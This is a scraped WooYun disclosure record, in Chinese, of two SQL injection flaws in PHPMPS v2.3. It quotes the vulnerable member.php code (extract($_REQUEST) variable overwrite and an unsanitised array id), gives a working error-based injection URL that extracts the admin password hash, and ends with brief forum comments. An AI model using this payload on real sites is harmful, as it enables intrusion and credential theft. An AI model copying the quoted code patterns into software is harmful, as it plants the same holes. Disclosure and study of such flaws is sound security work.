{"id": 8205, "wybug_id": "wooyun-2013-034617", "wybug_title": "phpmps_v2.3最新版两处SQL注入漏洞", "wybug_corp": "phpmps", "wybug_author": "My5t3ry", "wybug_date": "2013-08-20 18:24", "wybug_open_date": "2013-11-18 18:25", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入", "变量覆盖"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-20：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-11-18：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： PHPMPS对用户提交的参数处理不当，导致多个SQL注入漏洞. 详细说明：  member.php 422 - 455 ============================================================================================\tcase 'exchange':\t\t$units = array('gold'=>'枚', 'money'=>'元', 'credit'=>'分');\t\t$types = array('money'=>'资金', 'gold'=>'信息币', 'credit'=>'积分');\t\t$notes = array('login'=>'登陆积分', 'post_info_credit'=>'发布信息积分' ,'post_comment_credit'=>'发布评论积分' ,'info_refer'=>'一键更新信息' ,'info_top'=>'信息置顶' , 'credit2gold'=>'积分兑换信息币', 'money2gold'=>'资金购买信息币');\t\textract($_REQUEST);\t\t$page = isset($page) ? intval($page) : 1;\t\t$pagesize = 20;\t\t$sql = '';\t\tif($type) $sql .= \" AND type='$type' \";\t\tif($begindate) {\t\t\t$begintime = strtotime($begindate.' 00:00:00');\t\t\t$sql .= \" AND addtime>=$begintime \";\t\t}\t\tif($enddate) {\t\t\t$endtime = strtotime($enddate.' 23:59:59');\t\t\t$sql .= \" AND addtime<=$endtime\";\t\t}\t\t$r = $db->getOne(\"SELECT count(*) as number FROM {$table}pay_exchange WHERE username='$_username' $sql\");\t\t$pager['search'] = array('act' => 'exchange');\t\t$pager = get_pager('member.php', $pager['search'], $r, $page, $pagesize);\t\t$exchanges = array();\t\t$result = $db->query(\"SELECT * FROM {$table}pay_exchange WHERE username='$_username' $sql ORDER BY exchangeid DESC LIMIT $pager[start],$pager[size]\");\t\twhile($r = $db->fetchrow($result)) {\t\t\t$r['unit'] = $units[$r['type']];\t\t\t$r['type'] = $types[$r['type']];\t\t\t$r['note'] = !empty($notes[$r['note']]) ? $notes[$r['note']] : $r['note'];\t\t\t$r['addtime'] = date('Y-m-d h:i:s', $r['addtime']);\t\t\t$exchanges[] = $r;\t\t}\t\t$seo['title'] = '交易详情';\t\tinclude template('member_exchange');\tbreak;============================================================================================上面的代码使用了extract($_REQUEST);导致我们可以覆盖任意变量，通过覆盖变量$table可以构造注入利用如下：http://192.168.116.128/phpmps/member.php?act=check_info_gold&table=phpmps_member%20where%201=1%20and%20%28SELECT%201%20from%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28select%28select%20password%20from%20phpmps_admin%20limit%200,1%29%29,1,62%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%23SQL漏洞2：============================================================================================member.php 741 - 746 SQL   http://192.168.116.128/phpmps/member.php?act=delete&id[]=1a============================================================================================\tcase 'delete':\t\t$id = is_array($_REQUEST['id']) ? join(',', $_REQUEST['id']) : intval($_REQUEST['id']);\t\tif(empty($id))showmsg('没有选择记录');\t\t$db->query(\"DELETE FROM {$table}comment WHERE id IN ($id)\");\t\tshowmsg('删除成功', 'member.php?act=info_comment');\tbreak;============================================================================================这里没有考虑$id为数组的情况，当提交数组的时候可以注入。如： http://192.168.116.128/phpmps/member.php?act=delete&id[]=1a   漏洞证明：     修复方案：  过滤。。。   版权声明：转载请注明来源 My5t3ry@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-11-15 01:52 |    \t\tmomo \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:24        | ★精华漏洞数:24 | WooYun认证√)\t\t \n  这个可以有    \n     2013-11-18 18:52 |    \t\t纠结师 \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:12        | 传说中的废材)\t\t \n  洞子那么多 哈.    \n     2013-11-19 00:14 |    \t\t小权 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 小菜鸟，求各位大姐大哥多多指教)\t\t \n  这个可以有    \n     2013-11-19 11:22 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:10        )\t\t \n  大牛。。    \n     2013-11-20 16:41 |    \t\tXpunk \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | Music life)\t\t \n  无数个大学妹子被攻陷了。    \n     2013-11-22 19:06 |    \t\tTr0jan \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:3        | 关注网络安全)\t\t \n  哈哈 洞主发了这么多洞 全部被忽略 同情洞主    \n     2013-11-23 00:21 |    \t\tMy5t3ry \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        )\t\t \n  @Tr0jan 无奈    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}